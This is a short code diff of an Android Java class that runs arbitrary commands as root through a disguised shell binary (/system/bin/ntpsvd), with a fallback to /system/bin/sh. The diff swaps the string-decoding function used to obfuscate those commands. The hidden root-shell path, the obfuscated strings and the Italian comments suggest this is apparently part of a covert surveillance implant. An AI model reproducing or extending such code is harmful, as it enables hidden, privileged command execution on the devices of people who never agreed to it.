@@ -95,7 +95,7 @@ public class ExecuteAction extends SubActionSlow {
 		try {
 			//a_0=/system/bin/ntpsvd
 			// 35_0=qzx
-			String cmd = String.format("%s %s %s", Configuration.shellFile, M.d("qzx"), command ); // EXPORT
+			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command ); // EXPORT
 			ExecuteResult ret = Execute.execute(cmd);
 			
 			if (Cfg.DEBUG) {
@@ -153,7 +153,7 @@ public class ExecuteAction extends SubActionSlow {
 	public static boolean executeOrigin(String command) {
 		// Proviamo ad eseguire il comando da root
 		try {
-			String cmd[] = { Configuration.shellFile, M.d("qzx"), command }; // EXPORT
+			String cmd[] = { Configuration.shellFile, M.e("qzx"), command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
@@ -171,7 +171,7 @@ public class ExecuteAction extends SubActionSlow {
 
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			String cmd[] = { M.d("/system/bin/sh"), "-c", command }; // EXPORT
+			String cmd[] = { M.e("/system/bin/sh"), "-c", command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
